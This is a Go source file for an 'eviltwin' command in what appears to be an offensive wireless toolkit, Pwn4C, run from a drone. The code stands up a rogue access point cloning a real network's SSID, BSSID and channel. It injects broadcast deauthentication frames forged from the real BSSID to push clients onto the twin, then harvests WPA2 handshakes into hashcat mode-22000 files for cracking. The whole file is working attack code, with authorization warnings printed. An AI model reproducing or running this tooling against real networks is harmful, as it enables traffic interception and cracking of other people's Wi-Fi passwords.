package cmd

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/3lyly0/Pwn4C/internal/drone"
	"github.com/spf13/cobra"
)

var (
	eviltwinBSSID      string
	eviltwinSSID       string
	eviltwinChannel    int
	eviltwinPassphrase string
	eviltwinHidden     bool
	eviltwinKick       bool
	eviltwinKickCount  int
	eviltwinDuration   int
	eviltwinNoMonitor  bool
	eviltwinOutput     string
	eviltwinTarget     string
)

var eviltwinCmd = &cobra.Command{
	Use:   "eviltwin [target_drone_ip]",
	Short: "Impersonate an access point and capture the handshakes clients send it",
	Long: `Starts a rogue access point on the drone that copies a real network's SSID,
BSSID and channel, then captures what clients tell it.

The daemon runs hostapd on a dedicated __ap interface on the same radio as
the monitor. The twin therefore has to share the monitor's channel: the command
puts the radio on -c first (unless --no-monitor) and the twin follows. With
--kick it also sends a broadcast deauthentication from the real BSSID, so
associated clients drop, rescan, and see the twin as the strongest network.

  pwn4c eviltwin -b AA:BB:CC:DD:EE:FF -s "Home WiFi" -c 6 --passphrase "12345678"
  pwn4c eviltwin -b AA:BB:CC:DD:EE:FF -s "Home WiFi" -c 6 --kick --duration 120
  pwn4c eviltwin -b AA:BB:CC:DD:EE:FF -s "Cafe" -c 1 --no-monitor

A WPA2-PSK twin produces a crackable 4-way handshake when a client joins it;
the ready units are written as hashcat mode-22000 lines to -o (default
eviltwin.hc22000). An open twin produces no crackable handshake — it is for
captive-portal style testing only.

Only impersonate networks you own or are explicitly authorized to test.`,
	Args: cobra.MaximumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		if err := validateEvilTwinFlags(); err != nil {
			fmt.Printf("[!] %v\n", err)
			os.Exit(1)
		}

		target := eviltwinTarget
		if len(args) > 0 {
			target = args[0]
		}
		target = resolveTargetOrExit(target)
		client := connectOrExit(target)
		defer client.Close()

		fmt.Printf("[!] The twin impersonates %s. Only use it on networks you own\n",
			eviltwinBSSID)
		fmt.Println("    or are explicitly authorized to test.")

		units, err := runEvilTwinSession(client, evilTwinOptions{
			ssid:       eviltwinSSID,
			bssid:      eviltwinBSSID,
			channel:    eviltwinChannel,
			passphrase: eviltwinPassphrase,
			hidden:     eviltwinHidden,
			kick:       eviltwinKick,
			kickCount:  eviltwinKickCount,
			duration:   time.Duration(eviltwinDuration) * time.Second,
			noMonitor:  eviltwinNoMonitor,
		})
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			os.Exit(1)
		}

		if len(units) == 0 {
			fmt.Println("[!] No handshake captured.")
			printEvilTwinHints(eviltwinPassphrase != "")
			os.Exit(1)
		}
		if err := writeHarvest(units, eviltwinOutput); err != nil {
			fmt.Printf("[!] %v\n", err)
			os.Exit(1)
		}
	},
}

// evilTwinOptions is one twin session, shared by the CLI and the shell.
type evilTwinOptions struct {
	ssid       string
	bssid      string
	channel    int
	passphrase string
	hidden     bool
	kick       bool
	kickCount  int
	duration   time.Duration
	noMonitor  bool
}

func validateEvilTwinFlags() error {
	if eviltwinBSSID == "" {
		return fmt.Errorf("--bssid is required: the twin must copy the real AP's MAC")
	}
	if eviltwinSSID == "" {
		return fmt.Errorf("--ssid is required")
	}
	if err := drone.ValidateRogueAPParams(drone.RogueAPParams{
		SSID:       eviltwinSSID,
		BSSID:      eviltwinBSSID,
		Channel:    eviltwinChannel,
		Passphrase: eviltwinPassphrase,
		Hidden:     eviltwinHidden,
	}); err != nil {
		return err
	}
	if eviltwinDuration < 0 || eviltwinDuration > 86_400 {
		return fmt.Errorf("--duration must be between 0 (until Ctrl+C) and 86400 seconds")
	}
	if eviltwinKickCount < 1 || eviltwinKickCount > 1000 {
		return fmt.Errorf("--kick-count must be between 1 and 1000")
	}
	return nil
}

// runEvilTwinSession starts the monitor (when needed), brings the twin up,
// watches it, and tears both down on the way out. It returns every handshake
// it saw, even when a later step failed.
func runEvilTwinSession(client *drone.ControlClient, o evilTwinOptions) ([]drone.Handshake, error) {
	status, err := client.GetStatus()
	if err != nil {
		return nil, fmt.Errorf("failed to query drone status: %w", err)
	}

	weStarted := false
	if !o.noMonitor && !status.MonitorActive {
		fmt.Printf("[+] Activating monitor mode on channel %d...\n", o.channel)
		if err := client.StartMonitor(o.channel); err != nil {
			return nil, fmt.Errorf("failed to enter monitor mode: %w", err)
		}
		weStarted = true
		status.MonitorActive = true
		status.Channel = o.channel
	} else if status.MonitorActive && status.Channel != o.channel {
		fmt.Printf("[+] Switching channel from %d to %d...\n", status.Channel, o.channel)
		if err := client.SetChannel(o.channel); err != nil {
			return nil, fmt.Errorf("failed to switch channel: %w", err)
		}
	}

	// A BSSID filter left behind by an earlier listen would hide the very
	// clients the twin is waiting for.
	if status.MonitorActive {
		if err := client.SetFilter(false, ""); err != nil {
			fmt.Printf("[!] Warning: failed to clear the frame filter: %v\n", err)
		}
	}

	security := "open"
	if o.passphrase != "" {
		security = "WPA2-PSK"
	}
	fmt.Printf("[*] Starting the twin: %q on %s ch%d (%s)\n",
		o.ssid, o.bssid, o.channel, security)

	twin, err := client.StartRogueAP(drone.RogueAPParams{
		SSID:       o.ssid,
		BSSID:      o.bssid,
		Channel:    o.channel,
		Passphrase: o.passphrase,
		Hidden:     o.hidden,
	})
	if err != nil {
		if weStarted {
			stopEvilTwinMonitor(client)
		}
		return nil, fmt.Errorf("failed to start the twin: %w", err)
	}

	fmt.Printf("[+] Twin up on %s (%s/24) on channel %d\n",
		twin.Interface, twin.IP, twin.Channel)
	if !twin.Dnsmasq {
		fmt.Println("[!] dnsmasq did not start: the twin serves no DHCP.")
		fmt.Println("    Clients with a static address can still join; handshakes are unaffected.")
	}

	if o.kick {
		if status.MonitorActive {
			kickEvilTwinClients(client, o)
		} else {
			fmt.Println("[!] --kick needs the monitor radio; skipping the deauth burst.")
		}
	}

	units, watchErr := watchEvilTwin(client, o)

	fmt.Println("[*] Stopping the twin...")
	if _, err := client.StopRogueAP(); err != nil {
		fmt.Printf("[!] Warning: failed to stop the twin: %v\n", err)
	}
	if weStarted {
		stopEvilTwinMonitor(client)
	}

	return units, watchErr
}

// watchEvilTwin polls the twin's client count and the handshake table until
// Ctrl+C or --duration, reporting new units as they appear.
func watchEvilTwin(client *drone.ControlClient, o evilTwinOptions) ([]drone.Handshake, error) {
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sigCh)

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	var deadline <-chan time.Time
	if o.duration > 0 {
		deadline = time.After(o.duration)
	}

	seen := make(map[string]bool)
	var units []drone.Handshake
	lastClients := 0

	fmt.Println("[*] Twin is live — press Ctrl+C to stop.")
	if o.duration > 0 {
		fmt.Printf("    It will stop on its own after %s.\n", o.duration)
	}

	for {
		select {
		case <-sigCh:
			fmt.Println("\n[*] Interrupted.")
			return units, nil
		case <-deadline:
			fmt.Println("\n[*] Duration elapsed.")
			return units, nil
		case <-ticker.C:
		}

		twin, err := client.GetRogueAP()
		if err != nil {
			fmt.Printf("[!] Failed to read the twin's state: %v\n", err)
		} else {
			if !twin.Active {
				return units, fmt.Errorf("the twin went down unexpectedly")
			}
			if twin.Clients != lastClients {
				fmt.Printf("[+] %d client(s) associated to the twin\n", twin.Clients)
				lastClients = twin.Clients
			}
		}

		page, err := client.GetAllHandshakes()
		if err != nil {
			fmt.Printf("[!] Failed to read handshakes: %v\n", err)
			continue
		}
		for _, h := range page {
			key := harvestKey(h)
			if seen[key] {
				continue
			}
			seen[key] = true
			units = append(units, h)
			fmt.Printf("[+] %s %s — %s (ssid=%q)\n",
				h.BSSID, h.STA, harvestKind(h), h.SSID)
		}
	}
}

// kickEvilTwinClients sends a broadcast deauth from the real BSSID so its
// clients drop, rescan and pick the twin.
func kickEvilTwinClients(client *drone.ControlClient, o evilTwinOptions) {
	opts := drone.DefaultFrameOptions()
	opts.Channel = o.channel

	frameHex, err := drone.BuildManagementFrame(o.bssid, "ff:ff:ff:ff:ff:ff",
		drone.ReasonClass3FromNonAssocSTA, opts)
	if err != nil {
		fmt.Printf("[!] Warning: failed to build the deauth frame: %v\n", err)
		return
	}

	fmt.Printf("[+] Kicking clients: %d broadcast deauth frame(s) from %s...\n",
		o.kickCount, o.bssid)
	res, err := client.InjectFrame(frameHex, o.kickCount, 10, 0)
	if err != nil {
		fmt.Printf("[!] Warning: deauth injection failed: %v\n", err)
		return
	}
	if res.Pending > 0 {
		if err := waitForTxDrain(client, 10*time.Second); err != nil {
			fmt.Printf("[!] Warning: lost contact during TX: %v\n", err)
		}
	}
}

func stopEvilTwinMonitor(client *drone.ControlClient) {
	fmt.Println("[*] Stopping monitor mode...")
	if err := client.StopMonitor(); err != nil {
		fmt.Printf("[!] Warning: failed to stop monitor mode: %v\n", err)
	}
}

// printEvilTwinHints explains why a twin produced nothing. `wpa` is false for
// an open twin, which can never yield a crackable 4-way.
func printEvilTwinHints(wpa bool) {
	fmt.Println("    Hints:")
	if !wpa {
		fmt.Println("      - an open twin has no 4-way handshake to crack; run it with")
		fmt.Println("        --passphrase to impersonate the real WPA2 network")
		return
	}
	fmt.Println("      - a client only handshakes when it actually joins the twin")
	fmt.Println("      - use --kick so associated clients drop and rescan")
	fmt.Println("      - give it longer (--duration 300) or watch with 'pwn4c clients'")
	fmt.Println("      - the twin's BSSID, SSID and channel must match the real AP")
}

func init() {
	eviltwinCmd.Flags().StringVarP(&eviltwinBSSID, "bssid", "b", "", "Real AP BSSID to impersonate (required)")
	eviltwinCmd.Flags().StringVarP(&eviltwinSSID, "ssid", "s", "", "SSID the twin advertises (required)")
	eviltwinCmd.Flags().IntVarP(&eviltwinChannel, "channel", "c", 6, "Channel of the real AP (1-13)")
	eviltwinCmd.Flags().StringVar(&eviltwinPassphrase, "passphrase", "", "WPA2 passphrase for the twin (8-63 chars; empty = open)")
	eviltwinCmd.Flags().BoolVar(&eviltwinHidden, "hidden", false, "Hide the twin's SSID")
	eviltwinCmd.Flags().BoolVar(&eviltwinKick, "kick", false, "Deauth clients from the real AP so they rescan")
	eviltwinCmd.Flags().IntVar(&eviltwinKickCount, "kick-count", 8, "Deauth frames to send with --kick")
	eviltwinCmd.Flags().IntVar(&eviltwinDuration, "duration", 0, "Stop after N seconds (0 = until Ctrl+C)")
	eviltwinCmd.Flags().BoolVar(&eviltwinNoMonitor, "no-monitor", false, "Do not start monitor mode (no capture, no --kick)")
	eviltwinCmd.Flags().StringVarP(&eviltwinOutput, "out", "o", "eviltwin.hc22000", "hashcat 22000 output file")
	eviltwinCmd.Flags().StringVarP(&eviltwinTarget, "target", "t", "", "Drone IP address")
	rootCmd.AddCommand(eviltwinCmd)
}
